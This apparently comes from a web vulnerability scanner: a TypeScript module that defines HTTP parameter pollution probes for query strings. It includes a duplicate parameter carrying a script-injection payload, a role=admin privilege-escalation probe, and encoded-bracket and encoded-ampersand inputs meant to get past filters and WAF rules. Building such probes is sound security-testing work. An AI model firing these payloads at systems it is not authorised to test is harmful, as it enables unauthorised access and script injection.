import type { PayloadVariant } from '../types';

export const META = {
  id: 'http-parameter-pollution-client',
  family: 'cache-poisoning' as const,
  name: 'HTTP Parameter Pollution (Client-Side)',
  description: 'Probes client-side HPP via duplicate and array-style query parameters to detect inconsistent parsing.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query'],
};

const PROBES = [
  { value: '?a=1&a=2', intent: 'Duplicate param with different values — first vs last wins varies by framework', signals: ['hpp-accepted'] },
  { value: '?a[]=1&a[]=2', intent: 'Array-style duplicate params — PHP/Rails style parameter merging', signals: ['hpp-accepted'] },
  { value: '?a=1%26a=2', intent: 'URL-encoded ampersand — may bypass single-param validators', signals: ['hpp-accepted'] },
  { value: '?a=1;a=2', intent: 'Semicolon-separated duplicate params — ASP.NET semicolon parsing', signals: ['hpp-accepted'] },
  { value: '?a=clean&a=<script>alert(1)</script>', intent: 'HPP with XSS in second param value — bypasses first-wins sanitizer', signals: ['hpp-accepted', 'xss-reflected'] },
  { value: '?role=user&role=admin', intent: 'HPP privilege escalation — server takes last role value', signals: ['hpp-accepted', 'privilege-escalation'] },
  { value: '?a=1&A=2', intent: 'Case-variant duplicate params — tests case-insensitive param merging', signals: ['hpp-accepted'] },
  { value: '?a%5b%5d=1&a%5b%5d=2', intent: 'URL-encoded bracket array params to bypass WAF bracket rules', signals: ['hpp-accepted'] },
];

export function variants(): PayloadVariant[] {
  return PROBES.map((p, i) => ({
    id: `hpp-client-${i + 1}`,
    family: 'cache-poisoning' as const,
    value: p.value,
    encoding: 'raw' as const,
    intent: p.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: p.signals,
  }));
}
